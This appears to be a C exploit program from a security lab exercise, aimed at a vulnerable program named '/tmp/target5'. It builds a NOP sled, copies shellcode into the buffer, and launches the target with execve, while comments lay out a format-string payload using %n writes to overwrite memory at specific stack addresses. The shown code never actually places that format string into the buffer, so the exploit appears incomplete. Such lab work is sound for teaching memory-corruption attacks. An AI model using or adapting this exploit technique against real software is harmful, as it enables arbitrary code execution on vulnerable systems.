#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[480];

  int i;
  for(i=0; i < 480; i++) {
    buf[i] = 0x90;
  }

  // format string
  // \xec\xfc\xff\xbf ***
  // \x01\x01\x01\x01
  // \xed\xfc\xff\xbf ***
  // \x01\x01\x01\x01
  // \xee\xfc\xff\xbf ***
  // \x01\x01\x01\x01
  // \xef\xfc\xff\xbf ***
  // %08x%08x%194x%n%16x%n%257x%n%192x%n

  strncpy(buf + 433, shellcode, 45);

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
